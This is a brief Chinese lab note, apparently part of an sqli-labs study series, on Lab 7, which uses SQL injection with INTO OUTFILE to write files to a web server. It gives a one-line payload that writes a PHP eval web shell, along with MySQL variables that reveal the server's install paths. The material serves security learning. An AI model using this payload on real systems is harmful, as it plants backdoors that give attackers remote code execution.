# Lab 7 GET - Dump into outfile - String （导出文件GET字符型注入）

+ 概要：把查询结果导出到文件中，常用语句为 `select "<?php @eval($_POST['giantbranch']);?>" into outfile "XXX\test.php" `， 当然要获取网站在系统中的具体路径（绝对路径） -- 怎么获取？根据系统和数据库猜测（那就是经验咯）；当然不是啦，SQL中有提供函数which有很大可能让我们获取到这个路径，看吧，用lab3的环境 -- 

@@datadir -- 读取数据库的路径

@@basedir -- 安装MYSQL路径

![7_1](.\images\7_1.png)

+ ps：在这里关于导出sql查询结果到文件的时候需要注意设置sql里面的secure-file-priv属性，若报以下错误可以参考`坑.md`

